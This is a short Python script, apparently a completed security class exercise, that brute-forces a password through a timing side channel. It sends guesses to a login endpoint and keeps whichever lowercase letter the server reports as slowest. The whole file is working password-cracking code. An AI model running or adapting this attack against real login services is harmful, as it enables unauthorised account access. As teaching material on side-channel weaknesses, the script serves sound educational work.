import json
import urllib
import string

__author__ = 'ahanes'

"""
Program to crack the password.

You need to finish it
"""

HOST = 'http://login.poop-dollah.com/login'
VALID_CHARS = string.ascii_lowercase


def check_password(username, password):
    """
    Check the password
    :param username: Username
    :param password: Password to try
    :return: Dictioary of the response.

    HINT:  The time field is important
    """
    params = urllib.urlencode(dict(username=username, password=password))
    resp = urllib.urlopen(HOST + '/login', params)
    return json.loads(resp.read())

def main():
    """
    TODO Fill in code here.  This is your cracker.

    Valid passwords contain only a-z (lower case alphabetic characters)
    VALID_CHARS can be treated as the set of valid password characters
    You can use check_password to test your password.
    :return:
    """
    password = ""
    for i in range(20):
        averages = {}
        for char in VALID_CHARS:
            time = 0
            iters = 1
            tmp_password = password + char
            for i in range(iters):
                resp = check_password('ahanes', tmp_password)
                if resp['status'] == 'success':
                    print("Done, password is " + tmp_password)
                    return 0
                else:
                    time += resp['time']
            averages[char] = float(time)/iters
        max_time = -1
        for char in averages:
            time = averages[char]
            if time > max_time:
                max_time = time
                max_char = char
        password += max_char
        print("Working password " + password)
    print("Nothing found")

if __name__ == '__main__':
    main()
